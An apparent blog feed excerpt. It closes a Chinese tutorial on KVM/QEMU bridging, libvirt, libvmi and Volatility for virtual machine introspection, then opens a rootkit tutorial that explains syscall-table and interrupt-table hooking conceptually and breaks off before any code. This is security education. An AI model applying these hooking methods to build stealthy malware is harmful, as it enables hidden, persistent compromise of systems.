&lt;p&gt;NAT方式是KVM/QEMU提供的默认方式，要设置桥接模式，首先在宿主机上安装桥接相关的包，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install bridge-utils. 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改/etc/network/interfaces&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;auto lo
iface lo inet loopback
auto eth0
iface eth0 inet manual
auto br0
iface br0 inet dhcp
   bridge_ports eth0
   bridge_stp off
   bridge_fd 9
   bridge_hello 2
   bridge_maxwait 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/etc/init.d/networking restart
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;配置好后，可运行brctl show命令，会显示：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bridge name      bridge id              STP enabled interfaces
br0              8000.68f728eddb0d      no          eth0
                                              vnet0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后在创建虚拟机的时候可添加-net nic -net tap参数，如&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/local/bin/qemu-system-x86_64 -hda imgname.img -vnc :1 -m 1024 -net nic -net tap -monitor stdio    
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后创建的虚拟机便工作在网桥模式中。&lt;/p&gt;
&lt;h3 id=&quot;0x02-虚拟机管理Libvirt&quot;&gt;&lt;a href=&quot;#0x02-虚拟机管理Libvirt&quot; class=&quot;headerlink&quot; title=&quot;0x02 虚拟机管理Libvirt&quot;&gt;&lt;/a&gt;0x02 虚拟机管理Libvirt&lt;/h3&gt;&lt;p&gt;除了用qemu命令行的方式创建与管理虚拟机，也可将一些命令行参数保存为xml配置文件，用libvirt来管理。libvirt是一套管理虚拟机的工具，包括管理虚拟机的API、一个守护进程（libvirtd)和一个命令行工具（virsh). Libvirt 的主要目标是提供一个单一途径以管理多种不同虚拟化方案已经虚拟化主机，包括KVM/QEMU,Xen,LXC等。安装libvirt后，会产生libvirtd进程以及virsh工具，要利用libvirt做开发，可调用其中的API。libvirt, libvirtd 以及virsh的关系如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/libvirt-internal.png&quot; alt=&quot;libvirt-internal&quot;&gt;&lt;/p&gt;
&lt;p&gt;详细介绍可参考：&lt;a href=&quot;http://libvirt.org/internals.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libvirt internals&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;安装libvirt: &lt;/p&gt;
&lt;p&gt;先安装libvirt所依赖的包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install libnl-dev libxml2 libxml2-dev  libpciaccess-dev libyajl-dev libdevmapper-dev libgnutls-dev
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如出现以下错误，都可以检查上述这些包是否安装好&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;error: Could not find libxml2 anywhere

error: You must install the GnuTLS library in order to compile and run libvirt

error: You must install device-mapper-devel/libdevmapper &amp;gt;= 1.0.0 to compile libvirt

error: libnl-devel &amp;gt;= 1.1 is required for macvtap support
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下载 libvirt1.3.2.tar.gz&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar xvf libvirt1.3.2.tar.gz
./configure
make &amp;amp;&amp;amp; make install
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装完成后，执行ldconfig同步链接库，否则会出现以下错误：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;virsh: error while loading shared libraries: libvirt.so.0: cannot open shared object file: No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行检查libvirt安装成功&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;which libvirtd
libvirtd –version
which virsh
virsh –version
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;若出现此类错误：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;error: Failed to reconnect to the hypervisor
error: no valid connection
error: Failed to connect socket to &amp;apos;/usr/local/var/run/libvirt/libvirt-sock&amp;apos;: No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;则很有可能是libvirtd进程没有开启，这时需要手动开启libvirtd,执行libvirtd -d 即可。(libvirtd具体参数可参考：&lt;a href=&quot;http://linux.die.net/man/8/libvirtd&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libvirtd manual&lt;/a&gt; ）&lt;/p&gt;
&lt;p&gt;另外注意，libvirt从1.3版本后增加了virtlogd特性，需要执行virtlogd -d手动开启virtlogd进程（virtlogd具体参数可参看：&lt;a href=&quot;https://www.mankier.com/8/virtlogd&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;virtlogd manual&lt;/a&gt; ）. 否则会出现以下错误：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;error: Failed to connect socket to &amp;apos;/usr/local/var/run/libvirt/virtlogd-sock&amp;apos;: No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装好libvirt后，便可配置好xml文件，用virsh来管理。具体virsh命令这里不做介绍，可参考其中一个配置文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;domain type=&amp;apos;kvm&amp;apos;&amp;gt;
&amp;lt;name&amp;gt;ubuntudemo&amp;lt;/name&amp;gt;&amp;lt;!--虚拟机名称--&amp;gt;
&amp;lt;memory&amp;gt;1048576&amp;lt;/memory&amp;gt;&amp;lt;!--最大内存，单位KB--&amp;gt;
&amp;lt;currentMemory&amp;gt;1048576&amp;lt;/currentMemory&amp;gt;&amp;lt;!--可用内存，单位k--&amp;gt;
&amp;lt;uuid&amp;gt;87d5b3d2-3618-4a59-9efb-aa869ff34999&amp;lt;/uuid&amp;gt;

&amp;lt;vcpu&amp;gt;1&amp;lt;/vcpu&amp;gt;&amp;lt;!--虚拟cpu个数--&amp;gt;
&amp;lt;os&amp;gt;
    &amp;lt;type arch=&amp;apos;x86_64&amp;apos;,machine=&amp;apos;pc&amp;apos;&amp;gt;hvm&amp;lt;/type&amp;gt;
    &amp;lt;boot dev=&amp;apos;hd&amp;apos;/&amp;gt;&amp;lt;!--光盘启动--&amp;gt;
&amp;lt;/os&amp;gt;
&amp;lt;features&amp;gt;
    &amp;lt;acpi/&amp;gt;
    &amp;lt;apic/&amp;gt;
    &amp;lt;pae/&amp;gt;
&amp;lt;/features&amp;gt;
&amp;lt;clock offset=&amp;apos;localtime&amp;apos;/&amp;gt;
&amp;lt;on_poweroff&amp;gt;destroy&amp;lt;/on_poweroff&amp;gt;
&amp;lt;on_reboot&amp;gt;restart&amp;lt;/on_reboot&amp;gt;
&amp;lt;on_crash&amp;gt;destroy&amp;lt;/on_crash&amp;gt;
&amp;lt;devices&amp;gt;
    &amp;lt;emulator&amp;gt;/usr/bin/qemu&amp;lt;/emulator&amp;gt; &amp;lt;!--先创建好软链接   ln -s /use/local/qemukvm1.1.2/bin/qemu-system-x86_64 /usr/bin/qemu--&amp;gt;
    &amp;lt;disk type=&amp;apos;file&amp;apos; device=&amp;apos;disk&amp;apos;&amp;gt;
        &amp;lt;driver name=&amp;apos;qemu&amp;apos; type=&amp;apos;qcow2&amp;apos;/&amp;gt;
        &amp;lt;source file=&amp;apos;/home/os.img/server12041.img&amp;apos;/&amp;gt;&amp;lt;!--目的镜像路径--&amp;gt;
        &amp;lt;target dev=&amp;apos;vda&amp;apos; bus=&amp;apos;virtio&amp;apos;/&amp;gt;
    &amp;lt;/disk&amp;gt;

    &amp;lt;interface type=&amp;apos;bridge&amp;apos;&amp;gt;&amp;lt;!--虚拟机网络连接方式--&amp;gt;
        &amp;lt;source bridge=&amp;apos;br0&amp;apos;/&amp;gt;&amp;lt;!--当前主机网桥的名称--&amp;gt;
        &amp;lt;mac address=&amp;quot;00:16:3e:5d:aa:a8&amp;quot;/&amp;gt;&amp;lt;!--为虚拟机分配mac地址，务必唯一，否则dhcp获得同样ip,引起冲突--&amp;gt;
    &amp;lt;/interface&amp;gt;
    &amp;lt;input type=&amp;apos;mouse&amp;apos; bus=&amp;apos;ps2&amp;apos;/&amp;gt;
    &amp;lt;!--vnc方式登录，端口号自动分配，自动加1，可以通过virsh vncdisplay ubuntudemo来查询（实际端口为显示结果+5900）--&amp;gt; 
    &amp;lt;graphics type=&amp;apos;vnc&amp;apos; port=&amp;apos;-1&amp;apos; autoport=&amp;apos;yes&amp;apos; listen=&amp;apos;0.0.0.0&amp;apos; keymap=&amp;apos;en-us&amp;apos;/&amp;gt;
&amp;lt;/devices&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x03-虚拟机监控Libvmi&quot;&gt;&lt;a href=&quot;#0x03-虚拟机监控Libvmi&quot; class=&quot;headerlink&quot; title=&quot;0x03 虚拟机监控Libvmi&quot;&gt;&lt;/a&gt;0x03 虚拟机监控Libvmi&lt;/h3&gt;&lt;p&gt;Libvmi是一套能从底层二进制信息重构虚拟机上层语义的C语言API。由于hypervisor(VMM)获取的全是客户机的二进制比特，用户为了从外部（比如宿主机)监控客户机的行为需要理解客户机上层的语义，比如客户机正在运行的进程列表、模块列表等信息，这种二进制到上层语义之间的gap称之为语义鸿沟（semantic gap)，从外部监控客户机的行为称之为虚拟机自省（VM Introspection）。 Libvmi提供的API，能够读取物理内存、虚拟内存、符号表（System.map）、暂停/打开虚拟机、接收内存与寄存器事件的通知等，让用户能很方便的构建插件，来读取进程列表、模块列表等信息（大部分linux原生监控工具都可以通过libvmi来构建). &lt;/p&gt;
&lt;p&gt;Libvmi目前支持Intel,AMD64以及ARM系统结构，支持的虚拟机平台包括XEN与KVM/QEMU，支持的被监控系统类型包括windows和linux. Libvmi从Xenaccess发展而来，要了解其详细原理，可参考论文&lt;a href=&quot;https://www.acsac.org/2007/papers/138.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Secure and Flexible Monitoring of Virtual Machines&lt;/a&gt;以及官方主页&lt;a href=&quot;http://libvmi.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libvmi&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;安装libvmi:&lt;/p&gt;
&lt;p&gt;先安装其依赖的包，注，这里针对KVM/QEMU，关于XEN依赖的包，会有所不同，可参考&lt;a href=&quot;http://libvmi.com/docs/gcode-install.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libvmi-installation&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install automake autoconf
apt-get install libtool
apt-get install flex bison
apt-get install check
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下载libvmi-0.10.1.tar.gz&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar xvf libvmi-0.10.1.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装    &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd libvmi-0.10.1
./autogen.sh
./congfigure
make 
make install
ldconfig
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;libvmi提供了很多plugin examples在/libvmi/examples文件夹中，&lt;br&gt;要运行其中的plugin（比如process-list，列举客户机中进程信息，类似linux的原生ls命令), 首先要找出客户机符号表中的一些偏移信息. libvmi提供了获取偏移信息的工具在/libvmi/tools/linux-offset-finder/ 文件夹中，将其拷贝到虚拟机中，make编译，生成了一个内核模块findoffset.ko，执行insmod findoffset.ko将其插入内核中，&lt;br&gt; 再执行dmesg 将得到的偏移信息，如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ostype = &amp;quot;Linux&amp;quot;;
sysmap = &amp;quot;/boot/System.map-3.2.0-29-generic&amp;quot;;
linux_name = 0x470;
linux_tasks = 0x248;
linux_mm=0x280;
linux_pid=0x2bc;
linux_pgd=0x58;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;写进宿主机的/libvmi/etc/libvmi-example.conf中，将libvmi-example.conf拷贝到/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中,注，这里libvmi会在/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中读取偏移信息。这些偏移信息实际上是通过读取客户机的System.map文件获取的。&lt;/p&gt;
&lt;p&gt;之后运行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/libvmi/examples/process-list ubuntudemo 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里ubuntudemo是创建的虚拟机名字。以下是列出的部分信息：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Process listing for VM ubuntudemo (id=3)
Next list entry is at: ffff88003d638248
[    0] swapper/0 (struct addr:ffffffff81c0d020)
[    1] init (struct addr:ffff88003d638000)
[    2] kthreadd (struct addr:ffff88003d639700)
[    3] ksoftirqd/0 (struct addr:ffff88003d63ae00)
[    6] migration/0 (struct addr:ffff88003d658000)
[    7] watchdog/0 (struct addr:ffff88003d659700)
[    8] cpuset (struct addr:ffff88003d65ae00)
[    9] khelper (struct addr:ffff88003d65c500)
[   10] kdevtmpfs (struct addr:ffff88003d65dc00)
[   11] netns (struct addr:ffff88003d698000)
[   12] sync_supers (struct addr:ffff88003d699700)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Libvmi提供的plugins有限，用户可根据需要编写，也可利用取证工具volatlity做更高层次语义的分析。Libvmi支持python绑定，提供了与volatility绑定的接口，具体可见下文。&lt;/p&gt;
&lt;h3 id=&quot;0x04-虚拟机监控Volatility&quot;&gt;&lt;a href=&quot;#0x04-虚拟机监控Volatility&quot; class=&quot;headerlink&quot; title=&quot;0x04 虚拟机监控Volatility&quot;&gt;&lt;/a&gt;0x04 虚拟机监控Volatility&lt;/h3&gt;&lt;p&gt;Volatility是一个用python编写的内存分析工具，与libvmi（利用sysystem.map符号表信息)不同的是，volatility利用可执行文件elf中的调试信息（dwarf格式）以及system.map符号表信息来获取更丰富的变量和函数语义。其支持windows， linux以及mac。 文中以Linux为例。&lt;/p&gt;
&lt;p&gt;Get Started:&lt;/p&gt;
&lt;p&gt;下载volatility包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/volatilityfoundation/volatility.git
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;创建Linux profile&lt;/p&gt;
&lt;p&gt;profile是个zip文件，包含内核数据结构以及调试信息，也就是dwarf文件（volatility称之为vtypes)与system.map的压缩包。&lt;/p&gt;
&lt;p&gt;volatility提供了一个内核模块在/volatility/tools/linux文件夹下来获取vtypes信息，将文件夹内容拷贝到要分析的客户机中，编译make，生成module.dwarf文件。在此之前请确保客户机中以及安装dwarfdump (apt-get install dwarfdump）。之后执行 head module.dwarf，会显示以下内容:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.debug_info

&amp;lt;0&amp;gt;&amp;lt;0+11&amp;gt;&amp;lt;DW_TAG_compile_unit&amp;gt; DW_AT_producer&amp;lt;GNU C 4.6.3&amp;gt; DW_AT_language&amp;lt;DW_LANG_C89&amp;gt;.....

&amp;lt;1&amp;gt;&amp;lt;45&amp;gt;&amp;lt;DW_TAG_typedef&amp;gt; DW_AT_name&amp;lt;__s8&amp;gt; DW_AT_decl_file&amp;lt;1 include/asm-generic/int-ll64.h&amp;gt;.....
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成&lt;/p&gt;
&lt;p&gt;接着将module.dwarf文件以及/boot/System.map-3.2.0-99-generic 文件（不同系统文件名不同）压缩成一个zip文件，如Ubuntu1204.zip。执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;zip volatility/volatility/plugins/overlays/linux/Ubuntu1204.zip volatility/tools/linux/module.dwarf /boot/System.map-3.2.0-99-generic
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用profile&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python vol.py --info | grep Linux 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; 这时会显示之前创建的profile名，Linuxubuntu1204x64.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;LinuxUbuntu1204x64    - A Profile for Linux Ubuntu1204 x64 &amp;lt;=== This is the one we just created
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;绑定libvmi的python接口&lt;/p&gt;
&lt;p&gt;在./volatility/plugins/addrspaces 有针对不同内存快照的物理地址空间，如vmware.py,lime.py，crash.py等。libvmi则提供了pyvmi接口，在/libvmi/tools/pyvmi文件夹中有个pyvmiaddressspace.py文件可供volatility使用，（若需要自己编写python程序，则需要build pyvmi，build过程可参见其中的README文件，若出现编译错误，请确保安装 apt-get install build-essentials, apt-get install python2.7-dev).&lt;br&gt;将pyvmiaddressspace.py文件拷贝至./volatility/plugins/addrespaces文件夹中便可以利用volatility的plugins来分析虚拟机的内存了。以linux_pslist plugin为例，执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python vol.py -l vmi://ubuntudemo --profile=Linuxubuntu1204x64 linux_pslist  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;若出现distorm3（反编译库)相关错误，请确保已经安装distorm3&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install python-pip
pip install distorm3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;绑定pyvmi接口后，volatility所有的plugins都可以用来分析虚拟机内存。 &lt;/p&gt;
&lt;p&gt;完&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;如转载本文请注明出处: &lt;a href=&quot;http://www.chongh.wiki/blog/2016/03/30/virt-setup-analysis/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/03/30/virt-setup-analysis/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;] &lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;0x0A-References&quot;&gt;&lt;a href=&quot;#0x0A-References&quot; class=&quot;headerlink&quot; title=&quot;0x0A References&quot;&gt;&lt;/a&gt;0x0A References&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://libvmi.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Libvmi&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://libvirt.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Libvirt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/volatilityfoundation/volatility/wiki&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Volatility wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.acsac.org/2007/papers/138.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Secure and Flexible Monitoring of Virtual Machines&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍了一套完整的虚拟化环境搭建与分析工作，包括虚拟机的创建，虚拟机的管理，以及虚拟机的监控。可根据自身需要阅读相关内容。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0x00 全文环境 &lt;/li&gt;
&lt;li&gt;0x01 虚拟机创建KVM/QEMU &lt;/li&gt;
&lt;li&gt;0x02 虚拟机管理Libvirt&lt;/li&gt;
&lt;li&gt;0x03 虚拟机监控Libvmi&lt;/li&gt;
&lt;li&gt;0x04 虚拟机监控Volatility&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="virtualization" scheme="http://yoursite.com/categories/virtualization/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Binary" scheme="http://yoursite.com/tags/Binary/"/>
    
      <category term="Virtualization" scheme="http://yoursite.com/tags/Virtualization/"/>
    
      <category term="KVM" scheme="http://yoursite.com/tags/KVM/"/>
    
      <category term="QEMU" scheme="http://yoursite.com/tags/QEMU/"/>
    
      <category term="Libvmi" scheme="http://yoursite.com/tags/Libvmi/"/>
    
      <category term="Volatility" scheme="http://yoursite.com/tags/Volatility/"/>
    
  </entry>
  
  <entry>
    <title>A Comprehensive Tutorial of Rootkit</title>
    <link href="http://yoursite.com/blog/2016/03/07/rootkit-tutorial/"/>
    <id>http://yoursite.com/blog/2016/03/07/rootkit-tutorial/</id>
    <published>2016-03-08T02:25:37.000Z</published>
    <updated>2016-04-22T15:35:52.000Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0x1: Definition of rootkit &lt;/li&gt;
&lt;li&gt;0x2: Classification of Rootkit&lt;/li&gt;
&lt;li&gt;0x3: Hooking(Kernel Object Hooking) Rootkit&lt;/li&gt;
&lt;li&gt;0x4: DKOM Rootkit&lt;/li&gt;
&lt;li&gt;0x5: Rootkit Objectives&lt;/li&gt;
&lt;li&gt;0x6: Example-Module Hiding&lt;/li&gt;
&lt;li&gt;0x7: Example-Process Hiding&lt;/li&gt;
&lt;li&gt;0x8: Rootkit Samples&lt;/li&gt;
&lt;li&gt;0x9: Rootkit Resources&lt;/li&gt;
&lt;li&gt;0xA: Acknowledgement&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;0x1-Definition-of-rootkit&quot;&gt;&lt;a href=&quot;#0x1-Definition-of-rootkit&quot; class=&quot;headerlink&quot; title=&quot;0x1: Definition of rootkit&quot;&gt;&lt;/a&gt;0x1: Definition of rootkit&lt;/h3&gt;&lt;p&gt;The term &lt;em&gt;rootkit&lt;/em&gt; originates from the composition of the individual terms root, referring to the highest privilege of access that can be obtained in a traditional Unix-based operating system, and &lt;em&gt;kit&lt;/em&gt;, referring to a set of programs that are designed to exploit a target system, gain root access and then maintain it without tripping any alarms. &lt;/p&gt;
&lt;p&gt;简而言之，rootkit是攻击者向计算机系统中植入的，能够隐藏自身踪迹并保留超级用户权限的恶意程序。与worms，virus不同的是，rootkit基于攻击者已经拿到root权限之后对系统进行破坏。rootkit会尽可能通过隐藏文件、进程、模块、进程等信息避免被监控程序检测。&lt;/p&gt;
&lt;h3 id=&quot;0x2-Classification-of-Rootkit&quot;&gt;&lt;a href=&quot;#0x2-Classification-of-Rootkit&quot; class=&quot;headerlink&quot; title=&quot;0x2: Classification of Rootkit&quot;&gt;&lt;/a&gt;0x2: Classification of Rootkit&lt;/h3&gt;&lt;p&gt;早期的rootkit主要为应用级rootkit，应用级rootkit主要通过替换login、ps、ls、netstat等系统工具,或者修改一些系统配置文件、脚本来实现隐藏及后门. 然而应用层rootkit比较容易检测，比如基于ring 3的chkrootkit检测工具。后期逐渐演变成内核rootkit,hypervisor rootkit以及硬件级rootkit. 内核rootkit可分为hooking rootkit以及DKOM rootkit。 下面就先来具体介绍这两种kernel rootkit。 hypervisor以及硬件级rootkit本文不做具体介绍，想了解更详细的rootkit分类，可参考这篇文章：&lt;a href=&quot;http://blog.invisiblethings.org/papers/2006/rutkowska_malware_taxonomy.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Introducing Stealth Malware Taxonomy
&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x3-Hooking-Kernel-Object-Hooking-Rootkit&quot;&gt;&lt;a href=&quot;#0x3-Hooking-Kernel-Object-Hooking-Rootkit&quot; class=&quot;headerlink&quot; title=&quot;0x3: Hooking(Kernel Object Hooking) Rootkit&quot;&gt;&lt;/a&gt;0x3: Hooking(Kernel Object Hooking) Rootkit&lt;/h3&gt;&lt;p&gt;Hooking rootkit 主要基于lkm(loadable kernel module)技术，以可加载内核模块的形式通过系统提供的接口加载到内核空间，成为内核的一部分，进而通过hook系统调用等技术实现隐藏、后门功能，这时，rootkit便是内核的一个模块。&lt;/p&gt;
&lt;p&gt;注：lkm is an object file that contains code to extend the running kernel, or so-called base kernel, of an operating system. lkm中文名为可加载内核模块，主要作用是用来扩展linux的内核功能。lkm的优点在于可以动态地加载到内存中，无须重新编译内核, 所以它经常被用于一些设备的驱动程序，例如声卡，网卡等等。当然因为其优点，也经常被骇客用于rootkit技术当中。关于lkm更多的知识，可参考&lt;a href=&quot;https://www.thc.org/papers/LKM_HACKING.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Complete Linux Loadable Kernel Modules&lt;/a&gt;, 文章中也有与系统调用劫持相关的代码分析，下文会继续提到。lkm只是hooking rootkit的存在形式，而真正的技术在于如何hooking. &lt;/p&gt;
&lt;p&gt;什么是hooking ? 来自wekipedia的解释： the term hooking covers a range of techniques used to alter or augment the behavior of an operating system, of applications, or of other software components by intercepting function calls or messages or events passed between software components. Code that handles such intercepted function calls, events or messages is called a “hook”.  假如正常执行的情况是 Funtion A -&amp;gt; Funtion B, 经过hooking之后的执行就变为 Funtion A -&amp;gt; Hook -&amp;gt; Funtion B. &lt;/p&gt;
&lt;p&gt;Hooking rootkit主要的hook对象是系统调用，也包括VFS函数劫持(如adore-ng),下文会提到。当应用程序发起系统调用(比如 open()打开文件)时，整个程序控制流就像这样：&lt;/p&gt;
&lt;p&gt;1). 触发中断，然后程序在中断处理器（interrupt handler)定义的中断中继续执行。在Linux上，INT 80指令用来触发中断。&lt;/p&gt;
&lt;p&gt;这时，rootkit可以用自己的函数替换内核的中断处理器。这需要修改IDT(Interrupt Descriptor Table). 具体修改代码下文还会继续提到。 &lt;/p&gt;
&lt;p&gt;2). 中断处理器在syscall table中查询被请求的syscall的地址，将执行跳转到该地址中。&lt;/p&gt;
&lt;p&gt; a 这时，rootkit可以修改中断处理器而使用另一个syscall table, 这种类型的rootkit相对较少，可参考 Suckit， 文章&lt;a href=&quot;http://phrack.org/archives/issues/58/7.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Phrack issue 58, article 0x07 (“Linux on-the-fly kernel patching without LKM”&lt;/a&gt;有具体描述.&lt;br&gt;这种方式属于DKOM rootkit, 下文会详细讲解。&lt;/p&gt;
&lt;p&gt; b 也可以只修改syscall table的入口地址，将其替换为rootkit自己的函数. 大部分的rootkit都采取这种方式，如adore-ng, knark, synapsis等。&lt;/p&gt;
&lt;p&gt;3). 执行系统调用函数， 控制权返回到应用程序。&lt;br&gt;这时，rootkit也可以重写系统调用函数，在函数起始处放置jump，跳转到自己的函数中。&lt;/p&gt;
&lt;p&gt;但很少有rootkit采用这种方法。&lt;/p&gt;
&lt;p&gt;对于2).b 类型的rootkit， 可参考以下代码&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span 